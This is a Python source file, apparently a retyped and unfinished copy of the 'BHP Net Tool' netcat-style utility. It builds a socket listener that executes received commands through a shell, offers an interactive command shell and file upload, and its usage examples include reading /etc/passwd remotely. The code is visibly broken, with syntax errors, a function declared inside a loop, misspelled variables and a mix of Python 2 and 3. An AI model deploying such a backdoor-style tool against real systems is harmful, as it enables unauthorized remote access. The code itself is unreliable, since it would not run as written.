import sys
import socket
import getopt
import threading
import subprocess

#Define some global variables

listen              = False
command             = False
upload              = ""
target              = ""
upload_desination   =""
port                = 0

def usage():
    print ("BHP Net Tool")
    print()
    print ("Usage: bhp.net.py -t target_host -p port")
    print ("-l --listen                -listen on [host]:[port] for incoming\
            connections")
    print("-e --execute=file_to_run - execute the given file upon recieveing "
          "a connection.")
    print("-c --command - initialize a command shell")
    print ("-u --upload=destination - upon recieving connaction upload a file and write to [destination]")
    print("Examples: ")
    print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global upload_desination
    global target

    if not len(sys.argv[1:]):
        usage()
    #Read the command line options.
    try:
       opts,args = getopt.getopt(sys.argv[1:], "hel:t:p:cu:",["help,",
                                                                "listen",
                                                                "execute",
                                                                "target",
                                                                "port",
                                                                "command",
                                                                "upload"])
    except getopt.GetoptError as err:
        print (str(err))
        usage()

    for o,a in opts:
        if o in ("-h,","--help"):
            usage()
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"


    #Are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:

        #read in the buffer from the commandline
        #this will block, so send CTRL-D if not sending input
        #To stdin
        buffer = sys.stdin.read()

        #send data off
        client_sender(buffer)

    #we are going to listen and potentially uplaod things,
    #Execute commands, and drop a shell back depending on our
    #line options above.
    if listen:
        server_loop()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #Connect to our target host.
        client.connect((target,port))

        if len(buffer):
            client.send(buffer)

        while True:

        #now wait for data back
            recv_len = 1
            response = ""

        while recv_len:
            data = client.recv(4096)
            recv_len = len(data)
            response += data

            if recv_len < 4096:
                break

        print(response),

        #wait for more input
        buffer = raw_input ("")
        buffer += "\n"

        #send it off
        client.send(buffer)

    except:
        print ("[*] Exception ! Exiting!")

        #Tear down this connection Mr. President!
        client.close()

def server_loop():
    global target

    #If no target is defined, we listen on all interfaces.
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        #Spin off a thread to handle our new client.
        client_thread - threading.Thread(target = client_handler,
                                         args=(client_socket),
                                               client_thread.start()
        def execute_command(int command):

    #trim the new line
    command = command.rstrip()

    #run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess. STDOUT,
        shell=True))
    except:
        output = "Failed to execute command. \r\n"

    #Send the output back to the client
    return output

